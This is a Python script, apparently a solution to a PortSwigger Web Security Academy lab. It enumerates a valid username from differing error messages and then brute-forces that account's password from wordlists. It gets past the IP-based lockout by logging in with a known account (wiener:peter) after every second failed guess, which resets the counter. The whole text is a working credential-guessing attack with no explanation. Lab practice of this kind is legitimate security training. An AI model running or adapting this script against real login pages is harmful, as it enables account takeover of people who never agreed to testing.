import sys
import urllib
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

fs = open("Username.txt", "r")
fp = open("Password.txt", "r")

def main():
    url = "https://0a5400490411d6e2c08a6c3100c80088.web-security-academy.net/login"
    username = ""
    count = 0
    print("(+) Retrieving username ...")
    user = {"username": "wiener", "password": "peter"}
    r = requests.post(url, data=user)
    
    for x in fs:
        username = x.strip("\n")
        data = {"username": username, "password": "123123123123123131323"}
        count += 1
        if count == 2:
            requests.post(url, data=user)
            count = 0
        r = requests.post(url, data=data)
        if "Invalid username" in r.text:
            sys.stdout.write(username)
            sys.stdout.write("\r")
            sys.stdout.flush 
        else:
            print("Correct username: " + username)
            break
    
    fs.close()
    count = 0
    password = ""
    print("(+) Retrieving password ...")
    requests.post(url, data=user)
    
    for x in fp:
        password = x.strip("\n")
        data = {"username": username, "password": password}
        count += 1
        if count == 2:
            requests.post(url, data=user)
            count = 0
        r = requests.post(url, data=data)
        if "Incorrect password" in r.text:
            sys.stdout.write(password)
            sys.stdout.write("\r")
            sys.stdout.flush
        else:
            print("Correct password: " + password)
            break
        
    fp.close()
    print("Done!!!")
    print("Username: " + username)
    print("Password: " + password)

if __name__ == "__main__":
    main()